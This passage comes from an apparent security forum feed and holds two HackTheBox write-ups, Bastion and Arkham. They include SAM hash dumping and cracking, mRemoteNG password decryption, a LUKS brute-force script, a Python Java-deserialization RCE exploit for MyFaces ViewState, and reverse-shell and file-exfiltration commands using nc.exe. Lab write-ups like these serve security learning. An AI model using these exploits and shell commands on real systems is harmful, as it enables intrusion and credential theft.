<p>But there is a solution to this problem. I’m going to mount this share on my own system and then mount the vhd files from there, giving me access to their content without having to download the whole huge file locally. We need to install two additional tools for this task:</p>
<pre><code class="lang-auto">$ sudo apt-get install cifs-utils
$ sudo apt-get install libguestfs-tools
</code></pre>
<p>Then we mount the share on our computer:</p>
<pre><code class="lang-auto">$ mount -t cifs //10.10.10.134/Backups /mnt/remote -o rw
</code></pre>
<p>So now we can access the share from /mnt/remote:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b05fd1f2ad49f3922c6535cc91542a3148cea26f.png" alt="image" data-base62-sha1="pahkmvxGoZ24c0ANB9hkaiKyZTp" width="442" height="156"></p>
<p>Once navigated to the folder where the two .vhd files reside we can mount them on our disk with guestmount:</p>
<pre><code class="lang-auto">$ guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd -v
</code></pre>
<p>So we have the whole disk at our disposal now!</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9769a0889e1b2968340e8358ee62dd41478e4661.png" alt="image" data-base62-sha1="lBsoZdDJdS2RoqjikMkESvW38NX" width="655" height="288"></p>
<hr>
<h2>Stealing user credentials from the SAM file</h2>
<p>The Users folder does not contain any flags and really there are only two truly interesting files in the whole backup, those two being SAM and SYSTEM: SAM is where Windows stores user passwords in an encrypted form, SYSTEM is where the encryption key for these passwords is located, so with these two files at hand we can get the credentials of the users. These files are stored in <em>/mnt/vhd/Windows/System32/config/</em> :</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/848f0380cf6aa4b36e9e29fd1292dcb878ef9ab6.png" alt="image" data-base62-sha1="iUFqKHDn9A4KUatI5r8GrSdg0CO" width="415" height="300"></p>
<p>We can list the users of which the crentials are stored in the SAM file using <em>chntpw</em> however if we mounted the virtual disk on a read-only mount we have to copy the file in a different folder first:</p>
<pre><code class="lang-auto">$ chntpw -l SAM
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6ef1cf8668a739550ce597f4e4853fcae1488e60.png" alt="image" data-base62-sha1="fPsB7gVBYzT20Ojqh40zXFl5tHW" width="480" height="214"></p>
<p>The Administrator and Guest accounts appear to be disabled so we cannot retrieve the administrator’s password, however L4mpje isn’t, so we can dump its hash and crack it with hashcat. First we use <em>samdump2</em> to create a text file containing all the hashes:</p>
<pre><code class="lang-auto">$ samdump2 ./SYSTEM ./SAM &gt; /home/baud/bastion/hash.txt
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a35426e6433260d35e08649992dab4c023b6ebbb.png" alt="image" data-base62-sha1="niS7AwXpIY720Fg7pWRSulQaDq3" width="649" height="122"></p>
<p>The last field is the hashed password, hashed in NTLM. In order for hashcat to crack it we need it to be all uppercase so we can do this with awk:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/12327e5667fbc71c0f3c572bf788e86cda58f435.png" alt="image" data-base62-sha1="2AYM87ngquLUEUqblIlAqsC0dj7" width="621" height="141"></p>
<p>Once we have the file with the correct hash in it we can use hashcat for a dictionary attack to crack it, I’m going to use the classic <em>rockyou.txt</em> wordlist, which is pretty much always sure to hit the target in CTF challenges:</p>
<pre><code class="lang-auto">$ hashcat -m 1000 -a 0 hashcat.txt rockyou.txt --force
</code></pre>
<p><strong>-m 1000</strong> tells hashcat what hash type we’re cracking, NTLMv2 in our case, and <strong>-a 0</strong> tells it to perform a dictionary attack. –force will run the attack despite hashcat not recognizing what hardware is installed on the computer, since I’m using a VM (installed on a bad laptop, I should add). In just a few seconds we get the results back and the password has been found:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/baa8973e2b49a0e265d28098ed18b3c70d1282f0.png" alt="image" data-base62-sha1="qDg0QjIPWQ53ybvt5AWXGpFVXTa" width="528" height="363"></p>
<p>So now we have a pair of working credentials that we can use to login using the SSH service running on the box:</p>
<pre><code class="lang-auto">User: L4mpje
Pass: bureaulampje
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6629915b06a3f7860cfe9fc5ce81ede902c9c4c1.png" alt="image" data-base62-sha1="ezLL9ECBQdrMI2nW3oo3oSXQaZ3" width="424" height="409"></p>
<p>And thanks to this we can grab the user.txt flag from our current user’s desktop:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d2054386a6c9f5b65c1791a5b4f47ca447826fc7.png" alt="image" data-base62-sha1="tXVxSgSbyWlUnWAvKN8uhpJPIQD" width="380" height="38"></p>
<p>Looking at the installed programs shows something interesting, mRemoteNG is present on the system, which is a program that can manage remote sessions using a variety of protocols such as RDP, VNC, and many more:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d27d5d2e306eafcfcc0651c27e3f461c7fd866d5.png" alt="image" data-base62-sha1="u24Rjrdh38LFI8nlP29t0QzrHbD" width="478" height="346"></p>
<p>It takes only a few seconds of Googling to find out that mRemoteNG saves the settings of its managed connections locally, these settings also include user passwords given to the program for the establishment of a connection, and there already exist plenty of scripts that are able to decrypt these passwords from their encrypted form. To be more specific, this is how the passwords are stored in encypted form by mRemoteNG:</p>
<pre><code class="lang-auto">encrypted_pass = base64(IV + AES-128-CBC(cleartext_pass, md5(mR3m), IV))
</code></pre>
<hr>
<h2>Privilege escalation: decrypting stored mRemoteNG passwords</h2>
<p>All the passwords are stored in a file called confCons.xml which can be found at <em>%appdata%\mRemoteNG</em>:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/ab89e6718a43dcb4793e0ce4b47ce0c2872ebfda.png" alt="image" data-base62-sha1="otv61D5V8biWQcLGeiEiN167Msa" width="605" height="387"></p>
<p>The file can be downloaded on our own box using <em>nc.exe</em> (or just use <em>net use</em> to enable a local share, whatever you prefer), first nc.exe is downloaded on Bastion:</p>
<pre><code class="lang-auto">$ powershell Invoke-WebRequest http://10.10.14.29:8080/nc.exe -OutFile ./nc.exe
</code></pre>
<p>Then we set up a netcat listener on our box:</p>
<pre><code class="lang-auto">$ nc -lvp 9999 &gt; confCons.xml
</code></pre>
<p>And then we send the file from Bastion:</p>
<pre><code class="lang-auto">$ nc -w 3 10.10.14.29 9999 &lt; %appdata%\mRemoteNG\confCons.xml
</code></pre>
<p>Once the file is transferred we can open it to see its content and we can notice that one of the saved sessions belongs to the Administrator account:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/22fe27bb05d725ff9bdc7203ea29114852b859ab.png" alt="image" data-base62-sha1="4ZyL3zEO828EfMwui84FRZNSCaD" width="587" height="318"></p>
<p>Now it’s time to decrypt this password. I’m going to use <a href="https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/mremoteng_decrypt.py" rel="noopener nofollow ugc">this</a> Python script from Github but there even is a Metasploit module to do so if one is already running a meterpreter session, which isn’t my case unfortunately:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5c8b6753e83342049508399bb0ad14001cb42435.png" alt="image" data-base62-sha1="dcGB5mhEUiOdg4iJz21Amy6nKiV" width="690" height="210"></p>
<p>So now we have the administrator’s credentials too!</p>
<pre><code class="lang-auto">User: Administrator
Pass: thXLHM96BeKL0ER2
</code></pre>
<p>We can use these to login using good old SSH and complete the box by grabbing the root flag:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/ab51a7df1c14bf740b806bb2d44293b7d95cfd21.png" alt="image" data-base62-sha1="oryAPDYpnmhBrnxtvT0XyNNmXNn" width="479" height="117"></p>
<p>And Bastion is done. Allow me to make a bit of shameless self promotion at the end of this post, if you read this far and would like to see more writeups maybe for boxes that have been retired for a while I am posting some of mine on my new <a href="https://offsecdeer.gitlab.io/" rel="noopener nofollow ugc">blog</a>, writeups won’t be my only focus but I already have a bunch over there so go take a look if you’re interested, I upload new ones as soon as I can so they’ll keep on growing. Also the blog is still very WIP so I apologize if the theme is bad and if it looks like shit from phones, I’ll get to it, one step at a time.</p>
<p>&lt;/shameless_self_promotion&gt;</p>
            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/hackthebox-writeup-bastion/16095">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/hackthebox-writeup-bastion/16095</link>
          <pubDate>Sun, 08 Sep 2019 02:23:45 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-16095</guid>
          <source url="https://0x00sec.org/t/hackthebox-writeup-bastion/16095.rss">HackTheBox Writeup: Bastion</source>
        </item>
        <item>
          <title>HackTheBox Writeup: Arkham</title>
          <dc:creator><![CDATA[Baud]]></dc:creator>
          <category>Hackthebox Writeups</category>
          <description><![CDATA[
            <p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/11eaeec32b8610728fa51dbf24560f2be789aa48.png" alt="image" data-base62-sha1="2yvsodiEz4fdMX6se6loVKZsFWE" width="598" height="378"><br>
Arkham is one of my favorite boxes on HTB and it just got retired, I personally wouldn’t have rated it as Medium but maybe it’s just because it’s the hardest Windows box I have faced so far, and it proved to be a lot of fun and a good way to learn more about Windows internals and post exploitation. Keep in mind that this is going to be a rather long writeup as I like showing all the steps and the thought process behind them. That being said, let’s start from the very beginning: enumeration.</p>
<hr>
<p><strong>Drawing the perimeter</strong></p>
<p>The usual basic nmap scan with service enumeration (-sV) and execution of default NSE scripts (-sC) on all ports (-p-) returns a few ports that may be of our interest:</p>
<pre><code>┌─[baud@parrot]─[~/arkham]
└──╼ $sudo nmap -sC -sV -p- -oA nmap 10.10.10.130
[sudo] password di baud:
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-07 19:19 CEST
Nmap scan report for 10.10.10.130
Host is up (0.025s latency).
Not shown: 65528 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
8080/tcp  open  http          Apache Tomcat 8.5.37
| http-methods:
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Mask Inc.
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -27s, deviation: 0s, median: -27s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-08-07 19:21:44
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.66 seconds
</code></pre>
<p>First of all, from the version of IIS running on port 80 (IIS 10.0) we can already tell we are dealing with either Windows Server 2016 or Windows 10, and opening the address <a href="http://10.10.10.130/" rel="noopener nofollow ugc">http://10.10.10.130</a> on a browser shows a default unalterated installation of IIS:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6260c4912a2db4cfbbab4f7d7a54175f03801647.png" alt="image" data-base62-sha1="e2i7cQsXNHIoavAPV76VmkNJD6f" width="690" height="486"><br>
Running gobuster with a big dictionary doesn’t return any results either so better focus somewhere else.</p>
<pre><code>┌─[✗]─[baud@parrot]─[~/arkham]
└──╼ $gobuster dir -w ../SecLists/Discovery/Web-Content/big.txt -t 50 -u http://10.10.10.130
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.130
[+] Threads:        50
[+] Wordlist:       ../SecLists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/08/08 17:12:31 Starting gobuster
===============================================================
===============================================================
2019/08/08 17:12:46 Finished
===============================================================
</code></pre>
<p>For example, there’s a second web server running on port 8080, this time it’s an Apache Tomcat server and there’s an actual custom website:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/66273c6743fcf0394df6da340b90b2aa4f8f0d55.jpeg" alt="image" data-base62-sha1="ezGLpcX02Y3jpaUy3oSnZb3WBRH" width="690" height="487"><br>
The website seems to be advertising a service called “Masks”, name which is actually a hint on the technology behind this web application, in fact the only functional button on the website is the “Subscription” button, which redirects to this URL:</p>
<pre><code>http://10.10.10.130:8080/userSubscribe.faces
</code></pre>
<p>The .faces extension tells us this page relies on the Java Server Faces framework (JFS), possibly the Apache MyFaces implementation since this is an Apache server. JFS is a framework used to design web-based user interfaces, and on this site it’s used to handle this simple subscription form:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c9fd5d2a6b9c1d2c599a7cc7322b1a093fd0ffa1.png" alt="image" data-base62-sha1="sOSNG5WvnfsDsFObYhhf3TyeZHP" width="645" height="413"><br>
The button generates a POST request to the same page, sending the server not only the address we provide, but also a hidden input field that was in the HTML code, called “javax.faces.ViewState”:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c6ee0960e32b6ecaaf08eea5bb005acc4067eefe.png" alt="image" data-base62-sha1="snOwSq8pYECwWs6UdwMrzv4uHzE" width="690" height="135"><br>
With a little <a href="https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html" rel="noopener nofollow ugc">research</a> I discover that ViewState is a variable used by JFS to determine what components are supposed to be displayed on the page, and it’s actually a serialized Java object which when not configured correctly can lead to RCE vulnerabilities. Because some implementations of JSF didn’t encrypt or sign this ViewState string it is possible for an attacker to craft a malicious serialized Java object to send in place of the original, this object can use the Java gadgets available to the application to execute code.</p>
<p>Unfortunately for us, Apache MyFaces enables ViewState encryption by default using DES/ECB/PKCS5 Padding and even an SHA1 HMAC with a secret key to verify the validity of the data before it is decrypted server-side. If you’re interested in knowing how all this works you’ll find some Java pseudo-code later in this writeup or you can consult <a href="https://www.programcreek.com/java-api-examples/?code=apache/myfaces-trinidad/myfaces-trinidad-master/trinidad-impl/src/main/java/org/apache/myfaces/trinidadinternal/util/StateUtils.java" rel="noopener nofollow ugc">the actual source code</a> responsible for encryption and decryption of the serialized object. Let’s leave all this information on hold for some time and continue exploring the box.</p>
<p>All gobuster can find on this second web server is a bunch of resource folders that we cannot list:</p>
<pre><code>/css
/favicons
/fonts
/images
/js
</code></pre>
<p>And excluding the two RPC ports I saved the most interesting one for last: SMB. Let’s list the available shares using smbclient:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/60347d1a14a0a5d955ee0db6719b9c11fa2fc33b.png" alt="image" data-base62-sha1="dJ4icKyp7HFDOHyWw0aZAT5HoCf" width="645" height="226"><br>
Despite it containing “secrets” the BatShare folder is accessible without authentication and it contains a .zip file:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3fdb6fc7a26b0abaa52de5a9a9236062736d51c9.png" alt="image" data-base62-sha1="96UdJkL07MFbCZJ5g9EFuA40d7z" width="690" height="176"></p>
<pre><code>smb: \&gt; get appserver.zip
getting file \appserver.zip of size 4046695 as appserver.zip (1415,4 KiloBytes/sec) (average 1415,4 KiloBytes/sec)
smb: \&gt; exit
┌─[baud@parrot]─[~]
└──╼ $file appserver.zip
appserver.zip: Zip archive data, at least v2.0 to extract
┌─[baud@parrot]─[~]
└──╼ $mv appserver.zip arkham/
┌─[baud@parrot]─[~]
└──╼ $cd arkham
┌─[baud@parrot]─[~/arkham]
└──╼ $unzip appserver.zip
Archive:  appserver.zip
  inflating: IMPORTANT.txt           
  inflating: backup.img              
</code></pre>
<p>The IMPORTANT.txt file contains a note for Alfred from Bruce, anticipating us that backup.img is password protected:</p>
<pre><code>Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce
</code></pre>
<p>Now it’s time for some trial and error. The easiest way to go past this obstacle is creating a subset of a big dictionary containing only Batman-related passwords to make our lives easier, I’m going to use rockyou.txt:</p>
<pre><code>$ cat /usr/share/wordlists/rockyou.txt | egrep 'batman|robin|alfred|joker|scarecrow|gotham' &gt; wordlist.txt
</code></pre>
<p>This command creates a new wordlist with all the entries in rockyou.txt that contain the specified Batman-related words. This returns less than 6000 passwords, much less than having to deal with the whole huge original dictionary:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/699f89e50a6ca25aa8c0dc83fc994901f92bba05.png" alt="image" data-base62-sha1="f4nWycnVKfiNrdzlF8sXAsZy84J" width="459" height="85"><br>
Because these are still a lot of passwords it’s necessary to automate the password guessing process. First let’s check what kind of image file we are dealing with:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7cdde08ac25728779eade1fb8999ef4dcac21904.png" alt="image" data-base62-sha1="hOCzHDfTTXbkkQSaNAt5DykLiF6" width="690" height="61"><br>
Because it’s a LUKS file we can use the cryptsetup utility to work with it, and it comes really handy that it supports an option to verify passwords:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7f5e6dd4b696844417ab7e58051e3499ca26cd50.png" alt="image" data-base62-sha1="iaKX1vhzfj7pjLnAihjuU5wVmP6" width="690" height="139"><br>
Thanks to this a simple bash script can be written to bruteforce the file:</p>
<pre><code class="lang-bash"># read a line from the wordlist
cat wordlist.txt | while read i; do
        echo -ne "\rTrying: \"$i\""\\r
        # pass the current password attempt to cryptsetup (the .img file is passed from stdin)
        echo $i | cryptsetup luksOpen $1 x --test-passphrase -T1 2&gt;/dev/null
        # grab cryptsetup's exit code
        STATUS=$?
        # was the operation successful?
        if [ $STATUS -eq 0 ]; then
                echo -e "\nPASSWORD FOUND: \"$i\""
                break
        fi
   done
</code></pre>
<p>The script is a little slow but it does the job and the password is found:</p>
<pre><code>┌─[root@parrot]─[/home/baud/arkham]
└──╼ #./luksBrute.sh backup.img
Trying: "batman"
Trying: "alfredo"
Trying: "alfred"
Trying: "robinson"
Trying: "batman1"
Trying: "joker"
Trying: "robin"
[....]
PASSWORD FOUND: "batmanforever"
</code></pre>
<p>cryptsetup automatically mapped the image file on to /dev/mapper/x so it needs to be mounted:</p>
<pre><code>┌─[root@parrot]─[/home/baud/arkham]
└──╼ # mkdir /mnt/arkham
┌─[root@parrot]─[/home/baud/arkham]
└──╼ # mount /dev/mapper/x /mnt/arkham
┌─[root@parrot]─[/home/baud/arkham]
└──╼ # ls -la /mnt/arkham/
totale 14
drwxr-xr-x 4 root root  1024 dic 25  2018 .
drwxr-xr-x 1 root root    38 ago  7 19:23 ..
drwx------ 2 root root 12288 dic 25  2018 lost+found
drwxrwxr-x 4 root root  1024 dic 25  2018 Mask
</code></pre>
<p>lost+found is empty but Mask contains MyFaces configuration files, other than a few random images which don’t contain anything interesting and have nothing to hide:</p>
<pre><code>┌─[root@parrot]─[/mnt/arkham]
└──╼ #ls -ls Mask
totale 880
  1 drwxr-xr-x 2 root root   1024 dic 25  2018 docs
95 -rw-rw-r-- 1 root root  96978 dic 25  2018 joker.png
103 -rw-rw-r-- 1 root root 105374 dic 25  2018 me.jpg
672 -rw-rw-r-- 1 root root 687160 dic 25  2018 mycar.jpg
  8 -rw-rw-r-- 1 root root   7586 dic 25  2018 robin.jpeg
  1 drwxr-xr-x 2 root root   1024 dic 25  2018 tomcat-stuff
┌─[root@parrot]─[/mnt/arkham]
└──╼ #ls -la Mask/tomcat-stuff
totale 193
drwxr-xr-x 2 root root   1024 dic 25  2018 .
drwxrwxr-x 4 root root   1024 dic 25  2018 ..
-rw-r--r-- 1 root root   1368 dic 25  2018 context.xml
-rw-r--r-- 1 root root    832 dic 25  2018 faces-config.xml
-rw-r--r-- 1 root root   1172 dic 25  2018 jaspic-providers.xml
-rw-r--r-- 1 root root     39 dic 25  2018 MANIFEST.MF
-rw-r--r-- 1 root root   7678 dic 25  2018 server.xml
-rw-r--r-- 1 root root   2208 dic 25  2018 tomcat-users.xml
-rw-r--r-- 1 root root 174021 dic 25  2018 web.xml
-rw-r--r-- 1 root root   3498 dic 25  2018 web.xml.bak
</code></pre>
<p>If you’re wondering, docs contains the scripts of Batman Begins. Confused? So am I. But here’s something very interesting to break the confusion, by taking a look at the configuration files I discover the encryption settings used by the server:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9927d49ba322e4696b7899fb31bb43a9ddb15950.png" alt="image" data-base62-sha1="lQSo8YjQ3sEStnnLDPnlGIpx8pq" width="690" height="451"><br>
Now that I know the secret keys used by the web application to encrypt and decrypt the ViewState object I can send my own malicious objects to achieve RCE.</p>
<hr>
<p><strong>A bit of cryptography</strong></p>
<p>I took a look at the MyFaces code to see how it works out of curiosity and altered it a bit to get rid of stuff I don’t need and to make it more readable, this is the function responsible for encrypting objects:</p>
<pre><code class="lang-java">public static byte[] encrypt(byte[] insecure, ExternalContext ctx)
{
    // no IV by default
    byte[] iv = null;
    // create the mac object
    Mac mac = Mac.getInstance("HmacSHA1");
    // give it the secret key
    mac.init("SnNGOTg3Ni0=");
    // declare the output cihper
    Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
    // initialize it with the secret key
    cipher.init(Cipher.ENCRYPT_MODE, "SnNGOTg3Ni0=");
    // SHA1 output = 20 bytes
    int macLenght = mac.getMacLength();
    // this array of bytes will contain the encrypted data. The mac is appeneded to it
    byte[] secure = new byte[cipher.getOutputSize(insecure.length) + macLenght];
    // encrypt data "insecure" and store the cipher in "secure"
    int secureCount = cipher.doFinal(insecure, 0, insecure.length, secure);
    // update the mac with the current params: source buffer, offset, amount of bytes
    mac.update(secure, 0, secureCount);
    // and then calculate it
    mac.doFinal(secure, secureCount);
    return secure;
}
</code></pre>
<p>And this one decrypts them:</p>
<pre><code class="lang-java">public static byte[] decrypt(byte[] secure, ExternalContext ctx)
{
    // no IV by default
    byte[] iv = null;
    // create the mac object
    Mac mac = Mac.getInstance("HmacSHA1");
    // give the object the secret key
    mac.init("SnNGOTg3Ni0=");
    // create a DES cipher for the decryption process
    Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
    // initialize the cipher for decryption with the secret key
    cipher.init(Cipher.DECRYPT_MODE, "SnNGOTg3Ni0=");
    // SHA1 output = 20 bytes
    int macLenght = mac.getMacLength();
    // calculate the mac from the received data
    mac.update(secure, 0, secure.length-macLenght);
    byte[] signedDigestHash = mac.doFinal();
    boolean isMacEqual = true;
    // check if the received mac has been calculated with the correct key
    for (int i = 0; i &lt; signedDigestHash.length; i++)
    {
        if (signedDigestHash[i] != secure[secure.length-macLenght+i])
        {
            isMacEqual = false;
        }
    }
    // if the two macs are equal the object is decrypted
    return cipher.doFinal(secure, 0, secure.length-macLenght);
}
</code></pre>
<p>The way it works is the serialized Java object is made of DES encrypted data with the HMAC used for verification appended at the end, it being the last 20 bytes. This structure is then encoded in Base64 and it’s what we saw earlier on Burp. The HMAC is used to calculate a message digest using the encrypted data and the secret key, when the server receives the ViewState object back it will first calculate a new HMAC from the data it received and the key stored in the settings, if it’s the same as the HMAC appended to the data then the data can be trusted and it is finally deserialized. Now that we have that secret key we can use it to calculate our own valid HMACs, allowing us to achieve RCE because our objects will look 100% legit.</p>
<hr>
<p><a name="exploitation" href="https://0x00sec.org"></a><br>
<strong>Exploitation: blind shell</strong></p>
<p>By exploiting this flaw we’ll be able to execute arbitrary Java gadgets that when chained together can perform several tasks, but because we’re not executing OS commands from the start we need a third party program to generate these chains for us and serialize them, for this purpose I downloaded <a href="https://github.com/frohoff/ysoserial" rel="noopener nofollow ugc">ysoserial</a> and used the CommonsCollections5 gadgets to execute cmd.exe on the system. ysoserial returns the serialized object on stdout so we can write a Python script that grabs the output from ysoserial and forwards it to the server after encrypting it properly and appending the correct HMAC to it:</p>
<pre><code class="lang-auto">import base64
import hashlib
import urllib
import hmac
import pyDes
import sys
import requests
import subprocess

# generate the serialized Java object
def getPayload(cmd):
    p = subprocess.Popen('java -jar /home/baud/arkham/ysoserial.jar CommonsCollections5 "'+cmd+'"', stdout=subprocess.PIPE, stderr=subprocess.PIPE,shell=True)
    payload = p.stdout.read()

    # encrypt the object with DES
    secret = bytes(base64.b64decode("SnNGOTg3Ni0="))
    des_obj = pyDes.des(secret, pyDes.ECB, IV=None, padmode=pyDes.PAD_PKCS5)
    encrypted_payload = des_obj.encrypt(payload)

    # calculate the HMAC
    mac_obj = hmac.new(secret, encrypted_payload, hashlib.sha1)
    mac = mac_obj.digest()

    # return [encrypted_data + HMAC]
    out = base64.encodestring(encrypted_payload + mac)
    out = out.replace('\n', '').replace('\r', '')
    return out

# ask for the command to be executed
while True:
    cmd = raw_input("&gt; ")
    if cmd == 'exit':
        sys.exit(0)

    # send a POST request to the server with our newly crafted ViewState object
    url = "http://10.10.10.130:8080/userSubscribe.faces"
    cookies = {"JSESSIONID": "38D5C0F7EAC7A6F06299275C268986BB"}
    req_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"}
    req_data={"j_id_jsp_1623871077_1:email": "baudy@baud.com", "j_id_jsp_1623871077_1:submit": "SIGN UP", "j_id_jsp_1623871077_1_SUBMIT": "1"}
    data['javax.faces.ViewState'] = getPayload(cmd)
    r = requests.post(url, cookies=cookies, data=req_data, headers=req_headers)
</code></pre>
<p>This script gives us a blind shell on the box, we are able to execute any operation we want but it’s still uncomfortable, and blind, so to have a proper shell I downloaded nc.exe on the box using Invoke-WebReques after starting an HTTP server with PHP and opening a listener to welcome the incoming connection:</p>
<pre><code>┌─[root@parrot]─[/home/baud/server]
└──╼ # php -S 0.0.0.0:9090 -t .
┌─[root@parrot]─[/home/baud/arkham]
└──╼ # nc -lvnp 9999
</code></pre>
<p>And from the blind shell :</p>
<pre><code>&gt; powershell iwr http://10.10.14.29:9090/nc.exe -OutFile ./nc.exe
&gt; nc.exe -e cmd 10.10.14.29 9999
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d5e210a24a1b0a0b679a9f3b8ab154429019358e.png" alt="image" data-base62-sha1="uw62FZSOW8goyVlArTHIx3f3YwC" width="690" height="360"><br>
With this we finally have a shell as Alfred and can read our first flag, then it’s time for some local enumeration. Aside from Alfred and Administrator there’s another user on the system: Batman. Unfortunately his directory is out of our reach.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/fa917547edcfb0060934724df94567e03b7eefe6.png" alt="image" data-base62-sha1="zKD0DgK4EX18YrgOYDJqqjGEkxo" width="503" height="254"><br>
<strong>Horizontal privilege escalation</strong></p>
<p>Inside Alfred’s downloads directory there’s a backups folder containing a backup.zip file, because I’m lazy and meterpreter executables are immediately detected by an angry Defender I’m going to use nc.exe to transfer this file locally:</p>
<pre><code># On Arkham:
nc.exe 10.10.14.29 4444 &lt; c:\users\alfred\downloads\backups\backup.zip
# On local box:
nc -lvp 4444 &gt; backup.zip
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5d69a7cd9b6e315cfa5b93fc8d176fa584395f03.png" alt="image" data-base62-sha1="dkmLM5PgNc3s7BgeCVg1oC5J5u3" width="578" height="405"><br>
After unzipping the file it turns out the content is a .ost file, so an Outlook mail archive, so to say. On Linux we can open it using readpst and it will extract the emails it finds:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/ea8d42602ed5a619c1de9d990939af119cd62b46.png" alt="image" data-base62-sha1="xsWnekMqKfJoZZ2LcjbASBLE1b8" width="615" height="391"><br>
The only email it found was in the Drafts folder and we can read it by catting the Drafts file created by readpst. The mail contains an image as attachment which is encoded in Base64 and the body of the message tells us this email was supposed to be sent to Master Wayne because he keeps forgetting his password:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/39d765447b9141596614b49516b6ba0e49285db6.png" alt="image" data-base62-sha1="8fGHjPZjSG60pZRYxR2TtQlFF7o" width="690" height="312"><br>
Convert the attachment back to .png and the result is this:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e09c74002b4943b302daf945645e4a649fb4fb1d.png" alt="image" data-base62-sha1="w309sPgVlWE88C5R0GAXrZWOmJL" width="656" height="330"><br>
Not only this picture gives us the Batman account’s password, it also gives us a big hint on one of the two ways we have to get root. So now we have a new pair of credentials:</p>
<pre><code>User: batman
Pass: Zx^#QZX+T!123
</code></pre>
<p>There are no services such as RDP or SSH running on the box so we cannot log in as Batman from the outside, but we can do it through a <a href="https://www.sconstantinou.com/windows-powershell-sessions-pssessions/" rel="noopener nofollow ugc">PSSession</a>:</p>
<pre><code class="lang-auto">$pw = ConvertTo-SecureString -string "Zx^#QZX+T!123" -AsPlainText -force;
$pp = new-object -typename System.Management.Automation.PSCredential -ArgumentList "ARKHAM\batman", $pw;
Enter-PSSession -ComputerName localhost -Credential $pp
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f10d7d2f4f7c874e4bf0b17667a4fb69fbfadf47.png" alt="image" data-base62-sha1="yorYalDBP4o67N3ReAKx6ChS0M7" width="690" height="188"><br>
Once in the PSSession we must follow the following syntax in order to run cmd commands:</p>
<pre><code>Invoke-Command -ScriptBlock { command }
</code></pre>
<p>This is very tedious to write every time so we can bypass this obstacle by using the nc.exe executable we uploaded earlier to start a normal cmd shell on another port:</p>
<pre><code>Invoke-Command -ScriptBlock {C:\tomcat\apache-tomcat-8.5.37\bin\nc.exe 10.10.14.29 9797 -e cmd.exe}
</code></pre>
